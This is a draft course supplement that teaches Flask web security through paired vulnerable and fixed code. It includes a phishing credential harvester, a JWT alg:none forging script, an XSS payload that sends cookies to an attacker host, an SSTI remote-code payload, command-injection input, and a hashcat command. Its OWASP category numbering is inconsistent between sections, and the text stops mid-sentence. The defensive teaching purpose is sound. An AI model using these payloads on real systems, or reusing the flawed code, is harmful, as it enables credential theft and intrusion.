**Flask Source-Code Security Supplement**

Module-by-Module Companion to the

**Secure Web Application Development (2-Day) Course**

*BBC Academy / JBI Training \| Draft v1.0*

**Purpose & Design Philosophy**

OWASP Juice Shop is an outstanding black-box target that puts delegates
in the attacker\'s seat. This Flask supplement adds a complementary
dimension: the developer\'s seat. By reading, running, breaking, and
fixing minimal Flask applications alongside each module, delegates gain
source-code literacy that Juice Shop alone cannot provide.

**Each supplement entry below follows a consistent structure:**

-   Learning objective --- what the Flask demo adds over Juice Shop

-   Delivery mode --- instructor demo, delegate practical, or group
    discussion

-   Suggested timing --- additional minutes within the existing slot

-   Vulnerable code --- the deliberately broken Flask snippet

-   Fixed code --- the corrected version with annotations

-   Discussion prompts --- questions to anchor the debrief

+-----------------------------------------------------------------------+
| **⚙️ Infrastructure Note**                                            |
|                                                                       |
| Flask and its dependencies (flask, flask-sqlalchemy, bcrypt,          |
| flask-jwt-extended) install in under 60 seconds on the existing       |
| Ubuntu VMs: pip3 install flask flask-sqlalchemy bcrypt                |
| flask-jwt-extended. No VM image changes are required for              |
| instructor-led demos. For delegate practicals, a pre-built            |
| \"vuln_flask_app\" directory can be placed on each VM during          |
| provisioning.                                                         |
+-----------------------------------------------------------------------+

**Module 1 --- Introductions & Lab Orientation**

No Flask exercise is appropriate here. Use this module to plant the seed
by mentioning Flask briefly in your opening preview: \"Throughout today
and tomorrow, alongside Juice Shop, you\'ll be reading short Flask
applications --- seeing the same vulnerabilities we\'ll exploit in the
source code that created them.\"

+-----------------------------------------------------------------------+
| **💡 Framing suggestion for Module 1**                                |
|                                                                       |
| Ask delegates during the opening quiz: \"When you fix a security bug, |
| what do you actually change?\" Most will answer in terms of           |
| configuration or tooling. This surfaces the gap that Flask demos will |
| fill --- the code itself.                                             |
+-----------------------------------------------------------------------+

**Module 2 --- Understanding Web Applications**

  -----------------------------------------------------------------------
  **Field**           **Detail**
  ------------------- ---------------------------------------------------
  **OWASP mapping**   Foundation (not a Top 10 item --- underpins all of
                      them)

  **Delivery mode**   Instructor live demo (\~8 mins)

  **Timing**          Replaces or accompanies the ZAP introduction

  **What Flask adds** Shows exactly how HTTP headers, cookies and
                      response bodies are constructed server-side ---
                      demystifying what ZAP captures
  -----------------------------------------------------------------------

**Learning Objective**

Delegates see a web application from both sides simultaneously: ZAP
shows the HTTP traffic, Flask shows the 10 lines of Python that produced
it. This dual view builds a mental model that purely black-box tools
cannot create.

**Demo: A Minimal Flask App as a Teaching Mirror**

Run this app alongside ZAP. Open ZAP\'s history panel, hit each route in
Firefox, and narrate what ZAP shows against what the Flask code does.

**app.py --- instructor demo application**

> from flask import Flask, request, make_response,
> render_template_string
>
> import secrets
>
> app = Flask(\_\_name\_\_)
>
> \# Route 1: Illustrates a plain GET response and response headers
>
> \@app.route(\"/\")
>
> def index():
>
> resp = make_response(\"\<h1\>Welcome\</h1\>\<p\>Check ZAP --- what
> headers do you see?\</p\>\")
>
> resp.headers\[\"X-Content-Type-Options\"\] = \"nosniff\"
>
> resp.headers\[\"X-Frame-Options\"\] = \"DENY\"
>
> \# Deliberately OMIT Content-Security-Policy here --- ask delegates to
> spot it
>
> return resp
>
> \# Route 2: Shows how a cookie is created and what its flags mean
>
> \@app.route(\"/login\", methods=\[\"POST\"\])
>
> def login():
>
> resp = make_response(\"Logged in\")
>
> resp.set_cookie(
>
> \"session_id\",
>
> value=secrets.token_hex(16),
>
> httponly=True, \# Not accessible via JavaScript
>
> secure=False, \# ← deliberately False for classroom HTTP; discuss why
> HTTPS matters
>
> samesite=\"Lax\"
>
> )
>
> return resp
>
> \# Route 3: Shows POST body parsing --- link to what ZAP\'s request
> tab shows
>
> \@app.route(\"/submit\", methods=\[\"POST\"\])
>
> def submit():
>
> data = request.form.get(\"username\", \"nobody\")
>
> return f\"\<p\>You sent: {data}\</p\>\" \# ← XSS is HERE --- revisit
> in Module 9
>
> if \_\_name\_\_ == \"\_\_main\_\_\":
>
> app.run(debug=True, port=5000)

**Discussion Prompts**

-   Which response headers is Flask adding automatically? Which are
    missing?

-   In Route 3, the username is echoed directly into HTML. What could go
    wrong? (Flag this --- you will return to it in Module 9.)

-   What does httponly=True actually prevent? Find the proof in ZAP\'s
    cookie details.

**Module 3 --- Information Security & Cybersecurity Fundamentals**

  -----------------------------------------------------------------------
  **Field**           **Detail**
  ------------------- ---------------------------------------------------
  **OWASP mapping**   A01 Broken Access Control (credential harvesting
                      context)

  **Delivery mode**   Instructor demo only --- ethical/legal framing
                      essential

  **Timing**          \~5 mins alongside BeEF/SE Toolkit demo

  **What Flask adds** Shows that a phishing credential harvester is
                      trivially simple to build --- shifting the
                      conversation from \"sophisticated attack\" to
                      \"this is 15 lines of Python\"
  -----------------------------------------------------------------------

**Learning Objective**

Delegates understand that the technical barrier to credential phishing
is extremely low. The sophistication lies in social engineering, not the
server code. This reframes how they think about training users and
building detection controls.

+-----------------------------------------------------------------------+
| **⚠️ Ethical & Legal Framing --- State this explicitly before showing |
| the code**                                                            |
|                                                                       |
| This code is shown purely to illustrate why user-awareness training   |
| matters. Running this against any real users or infrastructure        |
| without explicit written authorisation is illegal under the Computer  |
| Misuse Act 1990. It is only being demonstrated here within our closed |
| lab environment.                                                      |
+-----------------------------------------------------------------------+

**Demo: A 15-Line Credential Harvester**

**harvester.py --- instructor demo only (never leave on delegate VMs)**

> from flask import Flask, request
>
> app = Flask(\_\_name\_\_)
>
> captured = \[\]
>
> \@app.route(\"/\", methods=\[\"GET\", \"POST\"\])
>
> def phish():
>
> if request.method == \"POST\":
>
> captured.append({
>
> \"username\": request.form.get(\"username\"),
>
> \"password\": request.form.get(\"password\"),
>
> \"ip\": request.remote_addr
>
> })
>
> print(f\"\[CAPTURED\] {captured\[-1\]}\") \# In a real attack: exfil
> to attacker server
>
> return \"Login failed. Please try again.\" \# Convincing failure
> message
>
> return open(\"fake_login.html\").read() \# Cloned login page
>
> if \_\_name\_\_ == \"\_\_main\_\_\":
>
> app.run(port=8080)

**Discussion Prompts**

-   How many lines of code does it take to build a working credential
    harvester?

-   What would the HTTP traffic look like in ZAP? How would you
    distinguish it from a legitimate login?

-   What controls could detect or prevent this being reached by BBC
    staff? (Email filtering, DNS sinkholes, certificate checking, FIDO2
    keys.)

**Module 4 --- Introducing WebAppSec Good Practices**

  -----------------------------------------------------------------------
  **Field**           **Detail**
  ------------------- ---------------------------------------------------
  **OWASP mapping**   Multiple --- used as a \"spot the category\"
                      mapping exercise

  **Delivery mode**   Group exercise --- delegates read printed source
                      and categorise findings

  **Timing**          15--20 mins as the practical activity replacing or
                      extending the VM lab task

  **What Flask adds** Provides a tangible code artefact to attach OWASP
                      category labels to --- converting abstract taxonomy
                      into concrete recognition skills
  -----------------------------------------------------------------------

**Learning Objective**

After reading this single Flask application, delegates can map at least
five OWASP Top 10:2025 categories to specific lines of code. This is the
reverse of normal training: instead of learning categories then finding
examples, delegates find the problems first and then discover which
category owns them.

**Exercise: \"OWASP Bingo\" --- Find the Categories**

Print the code below (or share via shared screen). Give delegates 10
minutes to annotate it with OWASP category labels before revealing the
answers. Works especially well with mixed-ability groups because
developers spot code issues while testers and sysadmins often spot
configuration and design issues.

**vulnerable_shop.py --- contains 8 deliberate flaws. Can you name them
all?**

> from flask import Flask, request, session, jsonify
>
> import sqlite3, os, hashlib
>
> app = Flask(\_\_name\_\_)
>
> app.secret_key = \"password\" \# Flaw 1
>
> app.config\[\"DEBUG\"\] = True \# Flaw 2
>
> def get_db():
>
> return sqlite3.connect(\"shop.db\")
>
> \@app.route(\"/login\", methods=\[\"POST\"\])
>
> def login():
>
> username = request.form\[\"username\"\]
>
> password = request.form\[\"password\"\]
>
> pw_hash = hashlib.md5(password.encode()).hexdigest() \# Flaw 3
>
> db = get_db()
>
> \# Flaw 4 --- raw string interpolation in SQL
>
> row = db.execute(f\"SELECT \* FROM users WHERE username=\'{username}\'
> AND password_hash=\'{pw_hash}\'\").fetchone()
>
> if row:
>
> session\[\"user\"\] = username \# Flaw 5 --- stores username not
> user_id
>
> return jsonify({\"status\": \"ok\"})
>
> return jsonify({\"status\": \"fail\"}), 401
>
> \@app.route(\"/profile\")
>
> def profile(): \# Flaw 6 --- no authentication check
>
> user_id = request.args.get(\"user_id\") \# Flaw 7 --- IDOR
>
> db = get_db()
>
> row = db.execute(f\"SELECT \* FROM users WHERE
> id={user_id}\").fetchone()
>
> return jsonify(dict(zip(\[d\[0\] for d in db.description\], row)))
>
> \@app.route(\"/ping\")
>
> def ping():
>
> host = request.args.get(\"host\", \"localhost\")
>
> result = os.popen(f\"ping -c 1 {host}\").read() \# Flaw 8 --- command
> injection
>
> return f\"\<pre\>{result}\</pre\>\"
>
> if \_\_name\_\_ == \"\_\_main\_\_\":
>
> app.run()

**Answer Key --- OWASP Top 10:2025 Mapping**

-   Flaw 1 --- A02 Cryptographic Failures: Hardcoded, trivial secret key
    allows session forgery

-   Flaw 2 --- A05 Security Misconfiguration: DEBUG=True in code means
    it can reach production

-   Flaw 3 --- A02 Cryptographic Failures: MD5 is a broken hashing
    algorithm for passwords

-   Flaw 4 --- A03 Injection: Raw f-string SQL --- classic SQLi vector

-   Flaw 5 --- A07 Identification & Authentication Failures: Session
    stores mutable username, not immutable user ID

-   Flaw 6 --- A01 Broken Access Control: Route has no \@login_required
    or session check

-   Flaw 7 --- A01 Broken Access Control: IDOR --- any user_id can be
    queried by any caller

-   Flaw 8 --- A03 Injection: Command injection via os.popen with
    unsanitised user input

**Module 5 --- Secure Web App Development Lifecycles & Supporting
Tools**

  -----------------------------------------------------------------------
  **Field**           **Detail**
  ------------------- ---------------------------------------------------
  **OWASP mapping**   ASVS, SSDLC (Microsoft SDL / OpenSAMM)

  **Delivery mode**   Instructor-led discussion using printed
                      requirements.txt

  **Timing**          \~8 mins within the breakout group SSDLC review

  **What Flask adds** Makes abstract SSDLC stages tangible by showing
                      what each stage would catch in the
                      vulnerable_shop.py from Module 4
  -----------------------------------------------------------------------

**Learning Objective**

Delegates map SSDLC stages to the specific flaws identified in Module 4,
reinforcing that security is not a single checkpoint but a sequence of
gates --- each of which would have caught different issues.

**Exercise: Which SSDLC Stage Catches Which Flaw?**

Using the 8 flaws from Module 4\'s vulnerable_shop.py, challenge
breakout groups to assign each flaw to the earliest SSDLC stage that
could have caught it:

-   Requirements / Threat Modelling: Flaws 6 & 7 (missing access control
    design) --- a threat model asking \"what if an attacker guesses
    another user\'s ID?\" would surface these before a line of code is
    written

-   Secure Coding Standards: Flaws 3 & 4 (MD5, raw SQL) --- a coding
    standard mandating bcrypt and parameterised queries catches these at
    the PR review stage

-   SAST (Static Analysis): Flaws 4 & 8 (SQLi, command injection) ---
    tools like Bandit for Python flag os.popen() and string-interpolated
    SQL automatically

-   Configuration Review: Flaws 1 & 2 (hardcoded secret, DEBUG) --- a
    pre-deployment checklist or secrets scanner (e.g. git-secrets,
    truffleHog) catches these

-   DAST / Penetration Test: Flaw 5 (session design flaw) --- only
    observable through runtime testing of session behaviour

**Supply Chain Note --- requirements.txt**

Briefly show delegates the difference between a pinned and unpinned
requirements.txt to anchor the A03 Software Supply Chain Failures
category:

**requirements.txt --- UNSAFE (unpinned)**

> flask
>
> requests
>
> sqlalchemy

**requirements.txt --- SAFER (pinned with hash verification)**

> flask==3.1.0 \\
>
> \--hash=sha256:5f873c5184c897c8d9d1b05df1e3d01b14910ce69607a117bd3277098a5836ac
>
> requests==2.31.0 \\
>
> \--hash=sha256:942c5a758f98d790eaed1a29cb6eefc7ffb0d1cf7af05c3d2791656dbd6ad1e1

**Module 6 --- A01 Broken Access Control & A07 Authentication Failures**

  -----------------------------------------------------------------------
  **Field**           **Detail**
  ------------------- ---------------------------------------------------
  **OWASP mapping**   A01 Broken Access Control, A07 Identification &
                      Authentication Failures

  **Delivery mode**   Delegate practical (\~20 mins) --- run the
                      vulnerable app on VM, exploit, then apply the fix

  **Timing**          This is the richest practical of Day 1 --- plan for
                      the full practical slot

  **What Flask adds** Delegates both exploit and fix an authentication
                      system, experiencing both attacker and developer
                      perspectives within a single exercise
  -----------------------------------------------------------------------

**Learning Objective**

Delegates exploit three distinct access control weaknesses in a running
Flask app, then apply the corresponding code fixes and verify that their
exploit no longer works. The act of breaking one\'s own fix is powerful
--- it confirms understanding rather than just procedure-following.

**Weakness 1: IDOR (Insecure Direct Object Reference)**

**VULNERABLE --- profile route uses attacker-controlled user_id**

> \@app.route(\"/api/profile\")
>
> def get_profile():
>
> \# BUG: user_id comes from the request, not from the authenticated
> session
>
> user_id = request.args.get(\"user_id\")
>
> user = db.session.get(User, user_id)
>
> return jsonify(user.to_dict())

**FIXED --- user_id is always taken from the server-side session**

> \@app.route(\"/api/profile\")
>
> \@login_required \# Flask-Login decorator
>
> def get_profile():
>
> \# FIX: only the authenticated user\'s own profile is accessible
>
> user = db.session.get(User, current_user.id)
>
> return jsonify(user.to_dict())

**Weakness 2: JWT Algorithm Confusion (alg:none attack)**

**VULNERABLE --- accepts tokens signed with algorithm \"none\"**

> import jwt
>
> \@app.route(\"/admin\")
>
> def admin():
>
> token = request.headers.get(\"Authorization\", \"\").replace(\"Bearer
> \", \"\")
>
> \# BUG: algorithms not restricted --- attacker can forge a token with
> alg:none
>
> payload = jwt.decode(token, options={\"verify_signature\": False})
>
> if payload.get(\"role\") == \"admin\":
>
> return \"Welcome, admin!\"
>
> return \"Forbidden\", 403

**Exploit --- generate a forged admin token in Python (show in ZAP)**

> import base64, json
>
> header =
> base64.urlsafe_b64encode(json.dumps({\"alg\":\"none\",\"typ\":\"JWT\"}).encode()).rstrip(b\"=\").decode()
>
> payload =
> base64.urlsafe_b64encode(json.dumps({\"role\":\"admin\",\"sub\":\"attacker\"}).encode()).rstrip(b\"=\").decode()
>
> forged = f\"{header}.{payload}.\" \# Empty signature --- accepted by
> vulnerable code
>
> print(forged)

**FIXED --- allowlist of accepted algorithms, signature always
verified**

> \@app.route(\"/admin\")
>
> def admin():
>
> token = request.headers.get(\"Authorization\", \"\").replace(\"Bearer
> \", \"\")
>
> try:
>
> \# FIX: explicit algorithm allowlist; SECRET_KEY loaded from
> environment
>
> payload = jwt.decode(token, app.config\[\"SECRET_KEY\"\],
> algorithms=\[\"HS256\"\])
>
> except jwt.InvalidTokenError:
>
> return \"Invalid token\", 401
>
> if payload.get(\"role\") == \"admin\":
>
> return \"Welcome, admin!\"
>
> return \"Forbidden\", 403

**Weakness 3: Session Cookie Containing Role**

**VULNERABLE --- client-side cookie determines privilege level**

> \@app.route(\"/login\", methods=\[\"POST\"\])
>
> def login():
>
> \# BUG: role stored in client-visible cookie --- trivially modified
>
> resp = make_response(\"OK\")
>
> resp.set_cookie(\"role\", \"user\") \# Attacker changes this to
> \"admin\" in DevTools
>
> return resp
>
> \@app.route(\"/dashboard\")
>
> def dashboard():
>
> if request.cookies.get(\"role\") == \"admin\":
>
> return \"Admin dashboard\"
>
> return \"User dashboard\"

**FIXED --- authoritative role stored in server-side session only**

> \@app.route(\"/login\", methods=\[\"POST\"\])
>
> def login():
>
> user = authenticate(request.form\[\"username\"\],
> request.form\[\"password\"\])
>
> if user:
>
> session\[\"user_id\"\] = user.id \# Server-side session; role looked
> up from DB each request
>
> return \"OK\"
>
> return \"Forbidden\", 403
>
> \@app.route(\"/dashboard\")
>
> \@login_required
>
> def dashboard():
>
> if current_user.role == \"admin\": \# Role authoritative from
> database, never from client
>
> return \"Admin dashboard\"
>
> return \"User dashboard\"

**Module 7 --- A02 Security Misconfiguration & A03 Software Supply Chain
Failures**

  -----------------------------------------------------------------------
  **Field**           **Detail**
  ------------------- ---------------------------------------------------
  **OWASP mapping**   A02 Security Misconfiguration, A03 Software Supply
                      Chain Failures

  **Delivery mode**   Instructor demo (Werkzeug debugger) + delegate
                      OSINT exercise

  **Timing**          \~10 mins demo; OSINT exercise runs concurrently
                      with existing activities

  **What Flask adds** The Werkzeug interactive debugger provides a
                      visceral demonstration of why debug=True in
                      production is a critical misconfiguration --- it
                      grants RCE to any browser
  -----------------------------------------------------------------------

**Demo: Werkzeug Debugger = Remote Code Execution**

Start the vulnerable app with debug=True. Navigate to a route that
raises an exception. Show delegates that the interactive debugger allows
arbitrary Python execution --- including reading /etc/passwd, listing
files, or opening a reverse shell.

**VULNERABLE --- debug mode enabled, secret key hardcoded**

> app = Flask(\_\_name\_\_)
>
> app.secret_key = \"dev\" \# Hardcoded --- in git history forever
>
> app.config\[\"DEBUG\"\] = True \# Never allow this in any environment
> reachable from a network
>
> \@app.route(\"/crash\")
>
> def crash():
>
> raise Exception(\"Oops\") \# Werkzeug debugger opens --- show
> delegates the console PIN bypass

**FIXED --- configuration from environment, debug off by default**

> import os
>
> app = Flask(\_\_name\_\_)
>
> app.secret_key = os.environ\[\"FLASK_SECRET_KEY\"\] \# Injected at
> runtime; never in source
>
> app.config\[\"DEBUG\"\] = os.environ.get(\"FLASK_DEBUG\",
> \"false\").lower() == \"true\"
>
> \# Production startup: FLASK_SECRET_KEY=\$(openssl rand -hex 32)
> gunicorn app:app
>
> \# Development startup: FLASK_DEBUG=true FLASK_SECRET_KEY=dev flask
> run

**Supply Chain --- Dependency Confusion Demo**

Show pip install of a package with no version pin, then show how pip
audit flags known CVEs. This directly supports the A03 category without
requiring any additional infrastructure.

> \# Install pip-audit on the delegate VMs (or run as instructor demo)
>
> pip3 install pip-audit
>
> \# Audit a deliberately outdated requirements.txt
>
> pip-audit -r requirements_vulnerable.txt
>
> \# Expected output: lists CVEs for outdated Flask, Werkzeug, Jinja2
> versions

**Module 8 --- A04 Cryptographic Failures & A08 Software & Data
Integrity Failures**

  -----------------------------------------------------------------------
  **Field**           **Detail**
  ------------------- ---------------------------------------------------
  **OWASP mapping**   A04 Cryptographic Failures, A08 Software & Data
                      Integrity Failures

  **Delivery mode**   Delegate practical --- run HashCat against MD5
                      hashes extracted from a Flask SQLite DB

  **Timing**          \~20 mins --- integrates naturally with existing
                      HashCat activity

  **What Flask adds** Closes the loop between the HashCat cracking
                      exercise and the code that produced the weak hashes
                      --- delegates can then apply the bcrypt fix
                      themselves
  -----------------------------------------------------------------------

**Part A: Password Storage --- From Plaintext to bcrypt**

**VULNERABLE --- MD5 password hashing (already in vulnerable_shop.py
from Module 4)**

> import hashlib
>
> def hash_password(password: str) -\> str:
>
> return hashlib.md5(password.encode()).hexdigest() \# MD5: broken,
> fast, rainbow-tabled
>
> \# Cracked in seconds:
>
> \# hashcat -m 0 hashes.txt rockyou.txt

**FIXED --- bcrypt with appropriate work factor**

> import bcrypt
>
> def hash_password(password: str) -\> bytes:
>
> return bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))
>
> \# rounds=12 means 2\^12 iterations --- deliberately slow for an
> attacker, fast enough for a user
>
> def check_password(password: str, stored_hash: bytes) -\> bool:
>
> return bcrypt.checkpw(password.encode(), stored_hash)
>
> \# hashcat against bcrypt: hours to days on commodity hardware vs
> milliseconds for MD5

**Part B: Data Integrity --- Hidden Field Tampering**

Flask\'s signed cookies protect session data, but many applications pass
sensitive values (prices, scores, user IDs) in hidden form fields or URL
parameters that are trivially modified. This exercise connects directly
to the Juice Shop price manipulation challenge.

**VULNERABLE --- price trusted from hidden form field**

> \@app.route(\"/checkout\", methods=\[\"POST\"\])
>
> def checkout():
>
> \# BUG: price comes from the browser --- an attacker sets it to 0.01
> in DevTools
>
> price = float(request.form\[\"price\"\])
>
> item_id = request.form\[\"item_id\"\]
>
> quantity = int(request.form\[\"quantity\"\])
>
> total = price \* quantity
>
> charge_customer(total)
>
> return f\"Charged £{total:.2f}\"

**FIXED --- price always looked up server-side from trusted source**

> \@app.route(\"/checkout\", methods=\[\"POST\"\])
>
> \@login_required
>
> def checkout():
>
> \# FIX: only item_id and quantity come from the browser
>
> item_id = request.form\[\"item_id\"\]
>
> quantity = int(request.form\[\"quantity\"\])
>
> \# Price is authoritative from the database --- never trusted from
> client
>
> item = db.session.get(Item, item_id)
>
> total = item.price \* quantity
>
> charge_customer(total)
>
> return f\"Charged £{total:.2f}\"

**Discussion Prompts**

-   After cracking the MD5 hashes with HashCat --- how long would bcrypt
    have taken? (Answer: demonstrate with a timing test: python3 -c
    \"import bcrypt, time; t=time.time(); bcrypt.hashpw(b\'password\',
    bcrypt.gensalt(12)); print(time.time()-t)\")

-   The checkout fix still trusts item_id from the browser. What could
    go wrong with that? (Answer: leads naturally into IDOR if item_id
    allows access to items the user cannot see.)

**Module 9 --- A05 Injection**

  -----------------------------------------------------------------------
  **Field**           **Detail**
  ------------------- ---------------------------------------------------
  **OWASP mapping**   A05 Injection (SQLi, XSS, Command Injection, SSTI)

  **Delivery mode**   Delegate practical --- four distinct injection
                      types, each with vulnerable code, exploit, and fix

  **Timing**          This is the richest Flask module --- plan for the
                      full 60-minute practical slot

  **What Flask adds** Jinja2\'s template injection (SSTI) is a
                      Flask-specific vulnerability that Juice Shop does
                      not demonstrate. The source/fix pairing for all
                      four types in one framework gives developers a
                      unified mental model.
  -----------------------------------------------------------------------

**Injection Type 1: SQL Injection**

**VULNERABLE**

> \@app.route(\"/search\")
>
> def search():
>
> q = request.args.get(\"q\", \"\")
>
> \# Payload: \' OR \'1\'=\'1
>
> rows = db.execute(f\"SELECT \* FROM products WHERE name LIKE
> \'%{q}%\'\").fetchall()
>
> return jsonify(\[dict(r) for r in rows\])

**FIXED**

> \@app.route(\"/search\")
>
> def search():
>
> q = request.args.get(\"q\", \"\")
>
> rows = db.execute(\"SELECT \* FROM products WHERE name LIKE ?\",
> (f\"%{q}%\",)).fetchall()
>
> return jsonify(\[dict(r) for r in rows\])

**Injection Type 2: Cross-Site Scripting (XSS)**

Jinja2 auto-escapes variables by default. The vulnerability arises when
developers override this with the \|safe filter or
render_template_string with unsanitised input.

**VULNERABLE --- \|safe filter disables auto-escaping**

> \# In Jinja2 template:
>
> \# Payload:
> \<script\>document.location=\'http://attacker/?\'+document.cookie\</script\>
>
> \<p\>Hello, {{ username \| safe }}!\</p\> {# \|safe tells Jinja2 NOT
> to escape #}
>
> \# Also vulnerable: render_template_string with user input
>
> \@app.route(\"/greet\")
>
> def greet():
>
> name = request.args.get(\"name\", \"world\")
>
> return render_template_string(f\"\<h1\>Hello {name}\</h1\>\") \# XSS
> AND SSTI

**FIXED --- rely on Jinja2 auto-escaping; never use \|safe on user
input**

> \# In Jinja2 template:
>
> \<p\>Hello, {{ username }}!\</p\> {# No \|safe --- Jinja2 escapes \<
> \> & \" \' automatically #}
>
> \# Use render_template with a separate file, never
> render_template_string with user data
>
> \@app.route(\"/greet\")
>
> def greet():
>
> name = request.args.get(\"name\", \"world\")
>
> return render_template(\"greet.html\", name=name) \# name auto-escaped
> in template

**Injection Type 3: Server-Side Template Injection (SSTI)**

SSTI is a Flask/Jinja2-specific injection class that Juice Shop does not
cover. It occurs when user-supplied strings are passed to
render_template_string() and is frequently more severe than XSS --- it
can lead to full remote code execution.

**VULNERABLE --- user input evaluated as Jinja2 template**

> \@app.route(\"/preview\")
>
> def preview():
>
> template = request.args.get(\"t\", \"Hello\")
>
> \# Payload: {{7\*7}} returns 49 --- template is being evaluated
>
> \# RCE payload:
> {{config.\_\_class\_\_.\_\_init\_\_.\_\_globals\_\_\[\'os\'\].popen(\'id\').read()}}
>
> return render_template_string(template)

**FIXED --- never pass user input to render_template_string**

> \# There is no safe way to render user-supplied Jinja2 templates.
>
> \# If dynamic templates are required, use a sandboxed engine (e.g.
> Jinja2 SandboxedEnvironment)
>
> \# or restrict input to a strict allowlist of known-safe template
> identifiers.
>
> from jinja2.sandbox import SandboxedEnvironment
>
> sandbox = SandboxedEnvironment()
>
> \@app.route(\"/preview\")
>
> def preview():
>
> template = request.args.get(\"t\", \"Hello\")
>
> return sandbox.from_string(template).render() \# Sandboxed --- still
> not recommended for production

**Injection Type 4: Command Injection**

**VULNERABLE --- unsanitised input passed to shell**

> import os
>
> \@app.route(\"/ping\")
>
> def ping():
>
> host = request.args.get(\"host\", \"localhost\")
>
> \# Payload: 127.0.0.1; cat /etc/passwd
>
> output = os.popen(f\"ping -c 1 {host}\").read()
>
> return f\"\<pre\>{output}\</pre\>\"

**FIXED --- subprocess with shell=False and an allowlisted input**

> import subprocess, re
>
> \@app.route(\"/ping\")
>
> def ping():
>
> host = request.args.get(\"host\", \"localhost\")
>
> \# Allowlist: only valid hostname/IP characters
>
> if not re.fullmatch(r\'\[a-zA-Z0-9.-\]+\', host):
>
> return \"Invalid host\", 400
>
> result = subprocess.run(\[\"ping\", \"-c\", \"1\", host\], \#
> shell=False: no shell metacharacters
>
> capture_output=True, text=True, timeout=5)
>
> return f\"\<pre\>{result.stdout}\</pre\>\"

**Module 10 --- A06 Insecure Design & A10 Mishandling of Exceptional
Conditions**

  -----------------------------------------------------------------------
  **Field**           **Detail**
  ------------------- ---------------------------------------------------
  **OWASP mapping**   A06 Insecure Design, A10 Mishandling of Exceptional
                      Conditions

  **Delivery mode**   Group threat modelling exercise using Flask app as
                      the system to model

  **Timing**          \~15 mins for the threat model exercise; code
                      snippets used as supporting illustrations

  **What Flask adds** Provides a concrete, code-level system description
                      for threat modelling --- far more realistic than a
                      whiteboard diagram
  -----------------------------------------------------------------------

**Insecure Design: Rate Limiting and Account Enumeration**

Two design flaws that are invisible at the code level but obvious at the
design level --- reinforcing that A06 is about decisions made before
coding begins.

**VULNERABLE --- no rate limiting, account enumeration via error
message**

> \@app.route(\"/login\", methods=\[\"POST\"\])
>
> def login():
>
> user =
> User.query.filter_by(username=request.form\[\"username\"\]).first()
>
> if not user:
>
> return \"User not found\", 401 \# BUG: different message reveals
> whether account exists
>
> if not check_password(request.form\[\"password\"\],
> user.password_hash):
>
> return \"Wrong password\", 401 \# BUG: attacker now knows account
> exists
>
> \# No rate limiting: unlimited login attempts
>
> return \"OK\"

**FIXED --- consistent error message, Flask-Limiter rate control**

> from flask_limiter import Limiter
>
> from flask_limiter.util import get_remote_address
>
> limiter = Limiter(app, key_func=get_remote_address)
>
> \@app.route(\"/login\", methods=\[\"POST\"\])
>
> \@limiter.limit(\"5 per minute\") \# Rate limit: 5 attempts per minute
> per IP
>
> def login():
>
> user =
> User.query.filter_by(username=request.form\[\"username\"\]).first()
>
> \# FIX: identical error message whether user exists or not
>
> if not user or not check_password(request.form\[\"password\"\],
> user.password_hash):
>
> return \"Invalid credentials\", 401
>
> return \"OK\"

**Exceptional Conditions: Stack Traces in Production**

**VULNERABLE --- unhandled exception leaks internal paths and library
versions**

> \# With debug=False but no error handler, Flask returns a generic 500
> page
>
> \# BUT with debug=True (common in staging/UAT), full stack trace is
> returned:
>
> \# Traceback \... File \"/home/ubuntu/app/models.py\", line 47, in
> get_user
>
> \# sqlalchemy.exc.OperationalError: (sqlite3.OperationalError) no such
> table: users
>
> \# Reveals: framework versions, file paths, database type, table names

**FIXED --- custom error handlers return safe, generic responses**

> import logging
>
> \@app.errorhandler(500)
>
> def internal_error(error):
>
> app.logger.error(f\"500 error: {error}\", exc_info=True) \# Full
> detail goes to log only
>
> return jsonify({\"error\": \"An internal error occurred. Reference:
> see server logs.\"}), 500
>
> \@app.errorhandler(404)
>
> def not_found(error):
>
> return jsonify({\"error\": \"Resource not found\"}), 404
>
> \# Never return the requested path in the 404 message --- avoids path
> disclosure

**Module 11 --- A09 Logging & Alerting Failures**

  -----------------------------------------------------------------------
  **Field**           **Detail**
  ------------------- ---------------------------------------------------
  **OWASP mapping**   A09 Security Logging & Monitoring Failures

  **Delivery mode**   Instructor demo --- run attack sequences against
                      the app with/without logging and compare what an
                      analyst would see

  **Timing**          \~10 mins demo; complements the Juice Shop logging
                      activity

  **What Flask adds** Makes the logging gap visceral: run an SQLi attack
                      against the app with no logging --- the server log
                      is empty. Then enable structured logging and repeat
                      --- the attack is immediately visible.
  -----------------------------------------------------------------------

**Part A: What No Logging Looks Like**

**VULNERABLE --- app with no security event logging**

> \@app.route(\"/login\", methods=\[\"POST\"\])
>
> def login():
>
> \# 500 failed login attempts will leave absolutely no trace
>
> user =
> User.query.filter_by(username=request.form\[\"username\"\]).first()
>
> if not user or not check_password(request.form\[\"password\"\],
> user.password_hash):
>
> return \"Invalid credentials\", 401 \# Silent failure --- no log, no
> alert
>
> return \"OK\"

**Part B: Structured Security Logging**

**FIXED --- security events logged with context for SIEM ingestion**

> import logging, json
>
> from datetime import datetime
>
> security_log = logging.getLogger(\"security\")
>
> def log_event(event_type, username, ip, success, detail=\"\"):
>
> \"\"\"Emit a structured JSON security event --- easy to ingest into
> Splunk/ELK/SIEM.\"\"\"
>
> security_log.warning(json.dumps({
>
> \"timestamp\": datetime.utcnow().isoformat(),
>
> \"event\": event_type,
>
> \"username\": username, \# NOTE: log the username attempted, NOT the
> password
>
> \"source_ip\": ip,
>
> \"success\": success,
>
> \"detail\": detail
>
> }))
>
> \@app.route(\"/login\", methods=\[\"POST\"\])
>
> \@limiter.limit(\"5 per minute\")
>
> def login():
>
> username = request.form.get(\"username\", \"\")
>
> user = User.query.filter_by(username=username).first()
>
> if not user or not check_password(request.form.get(\"password\",\"\"),
> user.password_hash):
>
> log_event(\"LOGIN_FAILURE\", username, request.remote_addr, False)
>
> return \"Invalid credentials\", 401
>
> log_event(\"LOGIN_SUCCESS\", username, request.remote_addr, True)
>
> return \"OK\"

+-----------------------------------------------------------------------+
| **🚨 What NOT to log --- equally important**                          |
|                                                                       |
| Never log: passwords (even hashed), full credit card numbers, session |
| tokens, or any data classified as Personal under UK GDPR / DPA 2018.  |
| Show delegates that \"username\" is logged but \"password\" is        |
| deliberately absent from the log_event() call above.                  |
+-----------------------------------------------------------------------+

**Discussion Prompts**

-   Run 20 failed login attempts against the unlogged version. Then
    check the Flask console. What do you see? (Nothing --- the attack is
    invisible.)

-   Now enable the logging version and repeat. What would a SOC analyst
